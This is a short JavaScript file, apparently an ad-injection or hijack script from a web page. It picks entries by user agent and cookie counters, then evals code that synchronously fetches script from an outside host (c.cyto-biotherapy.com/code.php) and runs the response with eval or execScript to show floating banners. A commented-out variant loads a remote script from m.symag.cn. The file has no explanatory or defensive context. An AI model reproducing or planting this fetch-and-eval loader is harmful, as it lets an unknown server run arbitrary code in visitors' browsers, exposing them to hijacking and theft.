function SetCookie(name,value){var exp=new Date();exp.setTime(exp.getTime()+24*60*60*1000);document.cookie=name+"="+escape(value)+";path=/;expires="+exp.toGMTString();return true;}
function getCookie(name)
{var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg))
return unescape(arr[2]);else
return null;}
function impc() {
	var userAgentInfo = navigator.userAgent;
	var Agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
	var flag = true;
	for (var v = 0; v < Agents.length; v++) {
		if (userAgentInfo.indexOf(Agents[v]) > 0) {
			flag = false;
			break;
		}
	}
	return flag;
}
var arr=new Array();
arr[1]='var a = new XMLHttpRequest();var c =  "http://c.cyto-biotherapy.com/";var b = c + "code.php?a=index&z=1645";if(a != null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript){window.execScript(a.responseText,"JavaScript");}else if(window.eval){window.eval(a.responseText,"JavaScript");}else{eval(a.responseText);}}}};a.open("GET",b,false);a.send(null);}';//下悬浮
arr[2]=arr[3]='var a = new XMLHttpRequest();var c =  "http://c.cyto-biotherapy.com/";var b = c + "code.php?a=index&z=1646";if(a != null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript){window.execScript(a.responseText,"JavaScript");}else if(window.eval){window.eval(a.responseText,"JavaScript");}else{eval(a.responseText);}}}};a.open("GET",b,false);a.send(null);}';//上悬浮
//arr[2]=arr[4]=';(function(){var m = document.createElement("script");var url = "http://m.symag.cn";m.src = url + "/1/27445.js?" + Math.round(Math.random() * 10000);var ss = document.getElementsByTagName("script")[0];ss.parentNode.insertBefore(m, ss);})();';

var arrlen=arr.length -1;
var cooki=getCookie('ggsjs');var cookis=getCookie('ggzs');
if(cooki===null){var sjs=parseInt(Math.random()*(arrlen) + 1);}
else{var sjs=cooki-0+1;}
if(sjs>arrlen){sjs=1;}
eval(arr[sjs]);
if(!impc()){cookis=cookis-0+1;
SetCookie('ggsjs',sjs);
SetCookie('ggzs',cookis);
if(sjs=='1'){var tabbars = document.getElementById("tabbars");tabbars.style.height="170px";}}